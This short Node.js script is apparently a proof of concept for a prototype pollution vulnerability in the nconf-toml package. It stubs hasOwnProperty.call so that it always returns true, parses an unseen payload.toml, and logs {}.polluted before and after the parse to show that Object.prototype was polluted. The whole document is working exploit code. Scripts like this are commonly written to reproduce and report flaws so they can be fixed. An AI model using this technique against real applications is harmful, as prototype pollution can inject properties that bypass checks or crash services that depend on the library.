Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const nt = require('nconf-toml');
const fs = require('fs');
const path = require('path');
nt.parse(fs.readFileSync(path.resolve(__dirname, './payload.toml'), 'utf-8'));
console.log({}.polluted);